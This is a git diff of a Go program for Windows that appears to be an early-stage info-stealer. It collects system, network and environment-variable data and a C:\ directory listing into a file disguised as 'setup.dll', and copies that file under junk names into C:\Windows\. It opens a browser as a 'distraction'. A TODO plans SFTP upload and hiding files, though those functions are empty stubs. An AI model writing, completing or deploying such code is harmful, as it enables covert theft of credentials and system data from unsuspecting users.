@@ -3,7 +3,6 @@ package main
 /*
 	TODO
 - Distraction (open Browser in full screen mode)
-- Get List of Directories in C:\
 - Copy Files to USB & C:\Windows\
 - Upload DLLs to SFTP Server
 - Download file from SFTP server and hide in exe on Desktop
@@ -23,20 +22,13 @@ import (
 )
 
 func main() {
-	distraction()
+	// distraction()
 	saveAllInfo()
-	// fileManger()
-}
-
-func fileManager() {
-	// hideFiles()
-	// exportFiles()
-	// downloadFiles()
+	fileManger()
 }
 
 func saveAllInfo() {
-	f, err := os.Create("crapS3751243.dll")
-	os.Link("crapS3751243.dll", "crapS3636862.dll")
+	f, err := os.Create("setup.dll")
 
 	system := sysGrab()
 	environment := envGrab()
@@ -55,15 +47,41 @@ func saveAllInfo() {
 	}
 }
 
+func fileManger() {
+	copyFiles()
+	// downloadFiles()
+	// exportFiles()
+	// hideFiles()
+}
+
+func copyFiles() {
+	input, err := ioutil.ReadFile("setup.dll")
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	ioutil.WriteFile("crapS3751243.dll", input, 0644)
+	ioutil.WriteFile("crapS3636862.dll", input, 0644)
+	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
+	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
+}
+
+func exportFiles() {
+
+}
+func downloadFiles() {
+
+}
+
 func hideFiles() {
 
 }
 
 func distraction() {
-	cmnd1 := exec.Command("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE", "-k")
-	cmnd2 := exec.Command("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "-kiosk")
-	cmnd1.Start()
-	cmnd2.Start()
+	cmd1 := exec.Command("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "https://matt.waiariki.net/")
+	// cmd := exec.Command("C:\\Program Files\\Mozilla Firefox\\firefox.exe", "https://matt.waiariki.net/")
+	// cmd.Start()
+	cmd1.Start()
 }
 
 func sysGrab() string {
@@ -86,6 +104,7 @@ func sysGrab() string {
 }
 
 func netGrab() string {
+	// Get Network Info
 	var networkInfo string
 
 	f, err := sysinfo.Host()
@@ -112,8 +131,8 @@ func netGrab() string {
 }
 
 func envGrab() string {
+	// Get env variables
 	var envoInfo string
-	// Get all env variables
 	for _, element := range os.Environ() {
 		variable := strings.Split(element, "=")
 		onlyString := variable[0] + " => " + variable[1] + "\n"
@@ -123,13 +142,15 @@ func envGrab() string {
 }
 
 func folderGrab() string {
+	// Get all folders and files in searchFolder
 	var envoInfo string
+	searchFolder := "C:\\"
 
-	files, err := ioutil.ReadDir("C:\\")
+	files, err := ioutil.ReadDir(searchFolder)
 	if err != nil {
 	}
 	for _, f := range files {
-		envoInfo += f.Name() + "\n"
+		envoInfo += searchFolder + f.Name() + "\n"
 	}
 
 	return envoInfo
